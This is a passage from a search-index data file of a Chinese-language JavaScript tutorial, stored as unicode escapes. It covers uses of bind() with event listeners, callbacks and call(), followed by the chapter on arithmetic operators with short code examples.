\u65b9\u6cd5\u6bcf\u8fd0\u884c\u4e00\u6b21\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570\uff0c\u8fd9\u4f1a\u4ea7\u751f\u4e00\u4e9b\u95ee\u9898\u3002\u6bd4\u5982\uff0c\u76d1\u542c\u4e8b\u4ef6\u7684\u65f6\u5019\uff0c\u4e0d\u80fd\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 element . addEventListener ( 'click' , o . m . bind ( o )); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7ed1\u5b9a bind() \u65b9\u6cd5\u751f\u6210\u7684\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u3002\u8fd9\u6837\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u53d6\u6d88\u7ed1\u5b9a\uff0c\u6240\u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u65e0\u6548\u7684\u3002 1 element . removeEventListener ( 'click' , o . m . bind ( o )); \u6b63\u786e\u7684\u65b9\u6cd5\u662f\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a 1 2 3 4 var listener = o . m . bind ( o ); element . addEventListener ( 'click' , listener ); // ... element . removeEventListener ( 'click' , listener ); \uff082\uff09\u7ed3\u5408\u56de\u8c03\u51fd\u6570\u4f7f\u7528 \u56de\u8c03\u51fd\u6570\u662f JavaScript \u6700\u5e38\u7528\u7684\u6a21\u5f0f\u4e4b\u4e00\uff0c\u4f46\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9519\u8bef\u662f\uff0c\u5c06\u5305\u542b this \u7684\u65b9\u6cd5\u76f4\u63a5\u5f53\u4f5c\u56de\u8c03\u51fd\u6570\u3002\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528 bind() \u65b9\u6cd5\uff0c\u5c06 counter.inc() \u7ed1\u5b9a counter \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var counter = { count : 0 , inc : function () { 'use strict' ; this . count ++ ; } }; function callIt ( callback ) { callback (); } callIt ( counter . inc . bind ( counter )); counter . count // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c callIt() \u65b9\u6cd5\u4f1a\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u65f6\u5982\u679c\u76f4\u63a5\u628a counter.inc \u4f20\u5165\uff0c\u8c03\u7528\u65f6 counter.inc() \u5185\u90e8\u7684 this \u5c31\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002\u4f7f\u7528 bind() \u65b9\u6cd5\u5c06 counter.inc \u7ed1\u5b9a counter \u4ee5\u540e\uff0c\u5c31\u4e0d\u4f1a\u6709\u8fd9\u4e2a\u95ee\u9898\uff0c this \u603b\u662f\u6307\u5411 counter \u3002 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u6bd4\u8f83\u9690\u853d\uff0c\u5c31\u662f\u67d0\u4e9b\u6570\u7ec4\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u5f53\u4f5c\u53c2\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\uff0c\u5f88\u53ef\u80fd\u4e5f\u4f1a\u51fa\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { name : '\u5f20\u4e09' , times : [ 1 , 2 , 3 ], print : function () { this . times . forEach ( function ( n ) { console . log ( this . name ); }); } }; obj . print () // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.print \u5185\u90e8 this.times \u7684 this \u662f\u6307\u5411 obj \u7684\uff0c\u8fd9\u4e2a\u6ca1\u6709\u95ee\u9898\u3002\u4f46\u662f\uff0c forEach() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this.name \u5374\u662f\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u503c\u3002\u7a0d\u5fae\u6539\u52a8\u4e00\u4e0b\uff0c\u5c31\u53ef\u4ee5\u770b\u5f97\u66f4\u6e05\u695a\u3002 1 2 3 4 5 6 7 8 9 10 obj . print = function () { this . times . forEach ( function ( n ) { console . log ( this === window ); }); }; obj . print () // true // true // true \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e5f\u662f\u901a\u8fc7 bind() \u65b9\u6cd5\u7ed1\u5b9a this \u3002 1 2 3 4 5 6 7 8 9 10 obj . print = function () { this . times . forEach ( function ( n ) { console . log ( this . name ); }. bind ( this )); }; obj . print () // \u5f20\u4e09 // \u5f20\u4e09 // \u5f20\u4e09 \uff083\uff09\u7ed3\u5408 call() \u65b9\u6cd5\u4f7f\u7528 \u5229\u7528 bind() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6539\u5199\u4e00\u4e9b JavaScript \u539f\u751f\u65b9\u6cd5\u7684\u4f7f\u7528\u5f62\u5f0f\uff0c\u4ee5\u6570\u7ec4\u7684 slice() \u65b9\u6cd5\u4e3a\u4f8b\u3002 1 2 3 [ 1 , 2 , 3 ]. slice ( 0 , 1 ) // [1] // \u7b49\u540c\u4e8e Array . prototype . slice . call ([ 1 , 2 , 3 ], 0 , 1 ) // [1] \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u7684 slice \u65b9\u6cd5\u4ece [1, 2, 3] \u91cc\u9762\uff0c\u6309\u7167\u6307\u5b9a\u7684\u5f00\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u5207\u5206\u51fa\u53e6\u4e00\u4e2a\u6570\u7ec4\u3002\u8fd9\u6837\u505a\u7684\u672c\u8d28\u662f\u5728 [1, 2, 3] \u4e0a\u9762\u8c03\u7528 Array.prototype.slice() \u65b9\u6cd5\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528 call \u65b9\u6cd5\u8868\u8fbe\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002 call() \u65b9\u6cd5\u5b9e\u8d28\u4e0a\u662f\u8c03\u7528 Function.prototype.call() \u65b9\u6cd5\uff0c\u56e0\u6b64\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\u53ef\u4ee5\u7528 bind() \u65b9\u6cd5\u6539\u5199\u3002 1 2 var slice = Function . prototype . call . bind ( Array . prototype . slice ); slice ([ 1 , 2 , 3 ], 0 , 1 ) // [1] \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\u5c31\u662f\uff0c\u5c06 Array.prototype.slice \u53d8\u6210 Function.prototype.call \u65b9\u6cd5\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u8c03\u7528\u65f6\u5c31\u53d8\u6210\u4e86 Array.prototype.slice.call \u3002\u7c7b\u4f3c\u7684\u5199\u6cd5\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5176\u4ed6\u6570\u7ec4\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var push = Function . prototype . call . bind ( Array . prototype . push ); var pop = Function . prototype . call . bind ( Array . prototype . pop ); var a = [ 1 , 2 , 3 ]; push ( a , 4 ) a // [1, 2, 3, 4] pop ( a ) a // [1, 2, 3] \u5982\u679c\u518d\u8fdb\u4e00\u6b65\uff0c\u5c06 Function.prototype.call \u65b9\u6cd5\u7ed1\u5b9a\u5230 Function.prototype.bind \u5bf9\u8c61\uff0c\u5c31\u610f\u5473\u7740 bind \u7684\u8c03\u7528\u5f62\u5f0f\u4e5f\u53ef\u4ee5\u88ab\u6539\u5199\u3002 1 2 3 4 5 6 7 function f () { console . log ( this . v ); } var o = { v : 123 }; var bind = Function . prototype . call . bind ( Function . prototype . bind ); bind ( f , o )() // 123 \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\u5c31\u662f\uff0c\u5c06 Function.prototype.bind \u65b9\u6cd5\u7ed1\u5b9a\u5728 Function.prototype.call \u4e0a\u9762\uff0c\u6240\u4ee5 bind \u65b9\u6cd5\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u4e0d\u9700\u8981\u5728\u51fd\u6570\u5b9e\u4f8b\u4e0a\u4f7f\u7528\u3002","title":"Function.prototype.bind()"},{"location":"oop/this/#_5","text":"Jonathan Creamer, Avoiding the \"this\" problem in JavaScript Erik Kronberg, Bind, Call and Apply in JavaScript Axel Rauschmayer, JavaScript\u2019s this: how it works, where it can trip you up","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"operators/arithmetic/","text":"\u7b97\u672f\u8fd0\u7b97\u7b26 \u00b6 \u8fd0\u7b97\u7b26\u662f\u5904\u7406\u6570\u636e\u7684\u57fa\u672c\u65b9\u6cd5\uff0c\u7528\u6765\u4ece\u73b0\u6709\u7684\u503c\u5f97\u5230\u65b0\u7684\u503c\u3002JavaScript \u63d0\u4f9b\u4e86\u591a\u79cd\u8fd0\u7b97\u7b26\uff0c\u8986\u76d6\u4e86\u6240\u6709\u4e3b\u8981\u7684\u8fd0\u7b97\u3002 \u6982\u8ff0 \u00b6 JavaScript \u5171\u63d0\u4f9b10\u4e2a\u7b97\u672f\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u5b8c\u6210\u57fa\u672c\u7684\u7b97\u672f\u8fd0\u7b97\u3002 \u52a0\u6cd5\u8fd0\u7b97\u7b26 \uff1a x + y \u51cf\u6cd5\u8fd0\u7b97\u7b26 \uff1a x - y \u4e58\u6cd5\u8fd0\u7b97\u7b26 \uff1a x * y \u9664\u6cd5\u8fd0\u7b97\u7b26 \uff1a x / y \u6307\u6570\u8fd0\u7b97\u7b26 \uff1a x ** y \u4f59\u6570\u8fd0\u7b97\u7b26 \uff1a x % y \u81ea\u589e\u8fd0\u7b97\u7b26 \uff1a ++x \u6216\u8005 x++ \u81ea\u51cf\u8fd0\u7b97\u7b26 \uff1a --x \u6216\u8005 x-- \u6570\u503c\u8fd0\u7b97\u7b26 \uff1a +x \u8d1f\u6570\u503c\u8fd0\u7b97\u7b26 \uff1a -x \u51cf\u6cd5\u3001\u4e58\u6cd5\u3001\u9664\u6cd5\u8fd0\u7b97\u6cd5\u6bd4\u8f83\u5355\u7eaf\uff0c\u5c31\u662f\u6267\u884c\u76f8\u5e94\u7684\u6570\u5b66\u8fd0\u7b97\u3002\u4e0b\u9762\u4ecb\u7ecd\u5176\u4ed6\u51e0\u4e2a\u7b97\u672f\u8fd0\u7b97\u7b26\uff0c\u91cd\u70b9\u662f\u52a0\u6cd5\u8fd0\u7b97\u7b26\u3002 \u52a0\u6cd5\u8fd0\u7b97\u7b26 \u00b6 \u57fa\u672c\u89c4\u5219 \u00b6 \u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\u662f\u6700\u5e38\u89c1\u7684\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u6c42\u4e24\u4e2a\u6570\u503c\u7684\u548c\u3002 1 1 + 1 // 2 JavaScript \u5141\u8bb8\u975e\u6570\u503c\u7684\u76f8\u52a0\u3002 1 2 true + true // 2 1 + true // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u662f\u4e24\u4e2a\u5e03\u5c14\u503c\u76f8\u52a0\uff0c\u7b2c\u4e8c\u884c\u662f\u6570\u503c\u4e0e\u5e03\u5c14\u503c\u76f8\u52a0\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\uff0c\u5e03\u5c14\u503c\u90fd\u4f1a\u81ea\u52a8\u8f6c\u6210\u6570\u503c\uff0c\u7136\u540e\u518d\u76f8\u52a0\u3002 \u6bd4\u8f83\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u52a0\uff0c\u8fd9\u65f6\u52a0\u6cd5\u8fd0\u7b97\u7b26\u4f1a\u53d8\u6210\u8fde\u63a5\u8fd0\u7b97\u7b26\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\uff0c\u5c06\u4e24\u4e2a\u539f\u5b57\u7b26\u4e32\u8fde\u63a5\u5728\u4e00\u8d77\u3002 1 'a' + 'bc' // \"abc\" \u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5b57\u7b26\u4e32\uff0c\u53e6\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u975e\u5b57\u7b26\u4e32\uff0c\u8fd9\u65f6\u975e\u5b57\u7b26\u4e32\u4f1a\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u8fde\u63a5\u5728\u4e00\u8d77\u3002 1 2 1 + 'a' // \"1a\" false + 'a' // \"falsea\" \u52a0\u6cd5\u8fd0\u7b97\u7b26\u662f\u5728\u8fd0\u884c\u65f6\u51b3\u5b9a\uff0c\u5230\u5e95\u662f\u6267\u884c\u76f8\u52a0\uff0c\u8fd8\u662f\u6267\u884c\u8fde\u63a5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd0\u7b97\u5b50\u7684\u4e0d\u540c\uff0c\u5bfc\u81f4\u4e86\u4e0d\u540c\u7684\u8bed\u6cd5\u884c\u4e3a\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u201c\u91cd\u8f7d\u201d\uff08overload\uff09\u3002\u7531\u4e8e\u52a0\u6cd5\u8fd0\u7b97\u7b26\u5b58\u5728\u91cd\u8f7d\uff0c\u53ef\u80fd\u6267\u884c\u4e24\u79cd\u8fd0\u7b97\uff0c\u4f7f\u7528\u7684\u65f6\u5019\u5fc5\u987b\u5f88\u5c0f\u5fc3\u3002 1 2 '3' + 4 + 5 // \"345\" 3 + 4 + '5' // \"75\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u4ece\u5de6\u5230\u53f3\u7684\u8fd0\u7b97\u6b21\u5e8f\uff0c\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u4e0d\u540c\u4f1a\u5bfc\u81f4\u4e0d\u540c\u7684\u7ed3\u679c\u3002 \u9664\u4e86\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff0c\u5176\u4ed6\u7b97\u672f\u8fd0\u7b97\u7b26\uff08\u6bd4\u5982\u51cf\u6cd5\u3001\u9664\u6cd5\u548c\u4e58\u6cd5\uff09\u90fd\u4e0d\u4f1a\u53d1\u751f\u91cd\u8f7d\u3002\u5b83\u4eec\u7684\u89c4\u5219\u662f\uff1a\u6240\u6709\u8fd0\u7b97\u5b50\u4e00\u5f8b\u8f6c\u4e3a\u6570\u503c\uff0c\u518d\u8fdb\u884c\u76f8\u5e94\u7684\u6570\u5b66\u8fd0\u7b97\u3002 1 2 3 1 - '2' // -1 1 * '2' // 2 1 / '2' // 0.5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51cf\u6cd5\u3001\u9664\u6cd5\u548c\u4e58\u6cd5\u8fd0\u7b97\u7b26\uff0c\u90fd\u662f\u5c06\u5b57\u7b26\u4e32\u81ea\u52a8\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fd0\u7b97\u3002 \u5bf9\u8c61\u7684\u76f8\u52a0 \u00b6 \u5982\u679c\u8fd0\u7b97\u5b50\u662f\u5bf9\u8c61\uff0c\u5fc5\u987b\u5148\u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7136\u540e\u518d\u76f8\u52a0\u3002 1 2 var obj = { p : 1 }; obj + 2 // \"[object Object]2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\u662f [object Object] \uff0c\u518d\u52a0 2 \u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u7ed3\u679c\u3002 \u5bf9\u8c61\u8f6c\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u89c4\u5219\u5982\u4e0b\u3002 \u9996\u5148\uff0c\u81ea\u52a8\u8c03\u7528\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u3002 1 2 var obj = { p : 1 }; obj . valueOf () // { p: 1 } \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u603b\u662f\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\uff0c\u8fd9\u65f6\u518d\u81ea\u52a8\u8c03\u7528\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u5c06\u5176\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 var obj = { p : 1 }; obj . valueOf (). toString () // \"[object Object]\" \u5bf9\u8c61\u7684 toString \u65b9\u6cd5\u9ed8\u8ba4\u8fd4\u56de [object Object] \uff0c\u6240\u4ee5\u5c31\u5f97\u5230\u4e86\u6700\u524d\u9762\u90a3\u4e2a\u4f8b\u5b50\u7684\u7ed3\u679c\u3002 \u77e5\u9053\u4e86\u8fd9\u4e2a\u89c4\u5219\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49 valueOf \u65b9\u6cd5\u6216 toString \u65b9\u6cd5\uff0c\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 var obj = { valueOf : function () { return 1 ; } }; obj + 2 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49 obj \u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de 1 \uff0c\u4e8e\u662f obj + 2 \u5c31\u5f97\u5230\u4e86 3 \u3002\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8e valueOf \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u6240\u4ee5\u4e0d\u518d\u8c03\u7528 toString \u65b9\u6cd5\u3002 \u4e0b\u9762\u662f\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var obj = { toString : function () { return 'hello' ; } }; obj + 2 // \"hello2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 toString \u65b9\u6cd5\u8fd4\u56de\u5b57\u7b26\u4e32 hello \u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5b57\u7b26\u4e32\uff0c\u52a0\u6cd5\u8fd0\u7b97\u7b26\u5c31\u53d8\u6210\u8fde\u63a5\u8fd0\u7b97\u7b26\uff0c\u8fd4\u56de\u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u6709\u4e00\u4e2a\u7279\u4f8b\uff0c\u5982\u679c\u8fd0\u7b97\u5b50\u662f\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u90a3\u4e48\u4f1a\u4f18\u5148\u6267\u884c toString \u65b9\u6cd5\u3002 1 2 3 4 5 var obj = new Date (); obj . valueOf = function () { return 1 }; obj . toString = function () { return 'hello' }; obj + 2 // \"hello2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u662f\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u5e76\u4e14\u81ea\u5b9a\u4e49\u4e86 valueOf \u65b9\u6cd5\u548c toString \u65b9\u6cd5\uff0c\u7ed3\u679c toString \u65b9\u6cd5\u4f18\u5148\u6267\u884c\u3002 \u4f59\u6570\u8fd0\u7b97\u7b26 \u00b6 \u4f59\u6570\u8fd0\u7b97\u7b26\uff08 % \uff09\u8fd4\u56de\u524d\u4e00\u4e2a\u8fd0\u7b97\u5b50\u88ab\u540e\u4e00\u4e2a\u8fd0\u7b97\u5b50\u9664\uff0c\u6240\u5f97\u7684\u4f59\u6570\u3002 1 12 % 5 // 2 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u6b63\u8d1f\u53f7\u7531\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u6b63\u8d1f\u53f7\u51b3\u5b9a\u3002 1 2 - 1 % 2 // -1 1 % - 2 // 1 \u6240\u4ee5\uff0c\u4e3a\u4e86\u5f97\u5230\u8d1f\u6570\u7684\u6b63\u786e\u4f59\u6570\u503c\uff0c\u53ef\u4ee5\u5148\u4f7f\u7528\u7edd\u5bf9\u503c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u9519\u8bef\u7684\u5199\u6cd5 function isOdd ( n ) { return n % 2 === 1 ; } isOdd ( - 5 ) // false isOdd ( - 4 ) // false // \u6b63\u786e\u7684\u5199\u6cd5 function isOdd ( n ) { return Math . abs ( n % 2 ) === 1 ; } isOdd ( - 5 ) // true isOdd ( - 4 ) // false \u4f59\u6570\u8fd0\u7b97\u7b26\u8fd8\u53ef\u4ee5\u7528\u4e8e\u6d6e\u70b9\u6570\u7684\u8fd0\u7b97\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u7684\u503c\uff0c\u65e0\u6cd5\u5f97\u5230\u5b8c\u5168\u51c6\u786e\u7684\u7ed3\u679c\u3002 1 2 6.5 % 2.1 // 0.19999999999999973 \u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26 \u00b6 \u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\uff0c\u662f\u4e00\u5143\u8fd0\u7b97\u7b26\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u8fd0\u7b97\u5b50\u3002\u5b83\u4eec\u7684\u4f5c\u7528\u662f\u5c06\u8fd0\u7b97\u5b50\u9996\u5148\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u52a0\u4e0a1\u6216\u8005\u51cf\u53bb1\u3002\u5b83\u4eec\u4f1a\u4fee\u6539\u539f\u59cb\u53d8\u91cf\u3002 1 2 3 4 5 6 var x = 1 ; ++ x // 2 x // 2 -- x // 1 x // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u53d8\u91cf x \u81ea\u589e\u540e\uff0c\u8fd4\u56de 2 \uff0c\u518d\u8fdb\u884c\u81ea\u51cf\uff0c\u8fd4\u56de 1 \u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u90fd\u4f1a\u4f7f\u5f97\uff0c\u539f\u59cb\u53d8\u91cf x \u7684\u503c\u53d1\u751f\u6539\u53d8\u3002 \u8fd0\u7b97\u4e4b\u540e\uff0c\u53d8\u91cf\u7684\u503c\u53d1\u751f\u53d8\u5316\uff0c\u8fd9\u79cd\u6548\u5e94\u53eb\u505a\u8fd0\u7b97\u7684\u526f\u4f5c\u7528\uff08side effect\uff09\u3002\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u662f\u4ec5\u6709\u7684\u4e24\u4e2a\u5177\u6709\u526f\u4f5c\u7528\u7684\u8fd0\u7b97\u7b26\uff0c\u5176\u4ed6\u8fd0\u7b97\u7b26\u90fd\u4e0d\u4f1a\u6539\u53d8\u53d8\u91cf\u7684\u503c\u3002 \u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff0c\u5c31\u662f\u653e\u5728\u53d8\u91cf\u4e4b\u540e\uff0c\u4f1a\u5148\u8fd4\u56de\u53d8\u91cf\u64cd\u4f5c\u524d\u7684\u503c\uff0c\u518d\u8fdb\u884c\u81ea\u589e/\u81ea\u51cf\u64cd\u4f5c\uff1b\u653e\u5728\u53d8\u91cf\u4e4b\u524d\uff0c\u4f1a\u5148\u8fdb\u884c\u81ea\u589e/\u81ea\u51cf\u64cd\u4f5c\uff0c\u518d\u8fd4\u56de\u53d8\u91cf\u64cd\u4f5c\u540e\u7684\u503c\u3002 1 2 3 4 5 var x = 1 ; var y = 1 ; x ++ // 1 ++ y // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u662f\u5148\u8fd4\u56de\u5f53\u524d\u503c\uff0c\u7136\u540e\u81ea\u589e\uff0c\u6240\u4ee5\u5f97\u5230 1 \uff1b y \u662f\u5148\u81ea\u589e\uff0c\u7136\u540e\u8fd4\u56de\u65b0\u7684\u503c\uff0c\u6240\u4ee5\u5f97\u5230 2 \u3002 \u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26 \u00b6 \u6570\u503c\u8fd0\u7b97\u7b26\uff08 + \uff09\u540c\u6837\u4f7f\u7528\u52a0\u53f7\uff0c\u4f46\u5b83\u662f\u4e00\u5143\u8fd0\u7b97\u7b26\uff08\u53ea\u9700\u8981\u4e00\u4e2a\u64cd\u4f5c\u6570\uff09\uff0c\u800c\u52a0\u6cd5\u8fd0\u7b97\u7b26\u662f\u4e8c\u5143\u8fd0\u7b97\u7b26\uff08\u9700\u8981\u4e24\u4e2a\u64cd\u4f5c\u6570\uff09\u3002 \u6570\u503c\u8fd0\u7b97\u7b26\u7684\u4f5c\u7528\u5728\u4e8e\u53ef\u4ee5\u5c06\u4efb\u4f55\u503c\u8f6c\u4e3a\u6570\u503c\uff08\u4e0e Number \u51fd\u6570\u7684\u4f5c\u7528\u76f8\u540c\uff09\u3002 1 2 3 + true // 1 + [] // 0 + {} // NaN \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u975e\u6570\u503c\u7ecf\u8fc7\u6570\u503c\u8fd0\u7b97\u7b26\u4ee5\u540e\uff0c\u90fd\u53d8\u6210\u4e86\u6570\u503c\uff08\u6700\u540e\u4e00\u884c NaN \u4e5f\u662f\u6570\u503c\uff09\u3002\u5177\u4f53\u7684\u7c7b\u578b\u8f6c\u6362\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff08 - \uff09\uff0c\u4e5f\u540c\u6837\u5177\u6709\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a\u6570\u503c\u7684\u529f\u80fd\uff0c\u53ea\u4e0d\u8fc7\u5f97\u5230\u7684\u503c\u6b63\u8d1f\u76f8\u53cd\u3002\u8fde\u7528\u4e24\u4e2a\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u7b49\u540c\u4e8e\u6570\u503c\u8fd0\u7b97\u7b26\u3002 1 2 3 var x = 1 ; - x // -1 - ( - x ) // 1 \u4e0a\u9762\u4ee3\u7801\u6700\u540e\u4e00\u884c\u7684\u5706\u62ec\u53f7\u4e0d\u53ef\u5c11\uff0c\u5426\u5219\u4f1a\u53d8\u6210\u81ea\u51cf\u8fd0\u7b97\u7b26\u3002 \u6570\u503c\u8fd0\u7b97\u7b26\u53f7\u548c\u8d1f\u6570\u503c\u8fd0\u7b97\u7b26\uff0c\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u503c\uff0c\u800c\u4e0d\u4f1a\u6539\u53d8\u539f\u59cb\u53d8\u91cf\u7684\u503c\u3002 \u6307\u6570\u8fd0\u7b97\u7b26 \u00b6 \u6307\u6570\u8fd0\u7b97\u7b26\uff08 ** \uff09\u5b8c\u6210\u6307\u6570\u8fd0\u7b97\uff0c\u524d\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u5e95\u6570\uff0c\u540e\u4e00\u4e2a\u8fd0\u7b97\u5b50\u662f\u6307\u6570\u3002 1 2 ** 4 // 16 \u6ce8\u610f\uff0c\u6307\u6570\u8fd0\u7b97\u7b26\u662f\u53f3\u7ed3\u5408\uff0c\u800c\u4e0d\u662f\u5de6\u7ed3\u5408\u3002\u5373\u591a\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\u8fde\u7528\u65f6\uff0c\u5148\u8fdb\u884c\u6700\u53f3\u8fb9\u7684\u8ba1\u7b97\u3002 1 2 3 // \u76f8\u5f53\u4e8e 2 ** (3 ** 2) 2 ** 3 ** 2 // 512 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6307\u6570\u8fd0\u7b97\u7b26\u662f\u53f3\u7ed3\u5408\uff0c\u6240\u4ee5\u5148\u8ba1\u7b97\u7b2c\u4e8c\u4e2a\u6307\u6570\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u662f\u7b2c\u4e00\u4e2a\u3002 \u8d4b\u503c\u8fd0\u7b97\u7b26 \u00b6 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff08Assignment Operators\uff09\u7528\u4e8e\u7ed9\u53d8\u91cf\u8d4b\u503c\u3002 \u6700\u5e38\u89c1\u7684\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u5f53\u7136\u5c31\u662f\u7b49\u53f7\uff08 = \uff09\u3002 1 2 3 4 5 // \u5c06 1 \u8d4b\u503c\u7ed9\u53d8\u91cf x var x = 1 ; // \u5c06\u53d8\u91cf y \u7684\u503c\u8d4b\u503c\u7ed9\u53d8\u91cf x var x = y ; 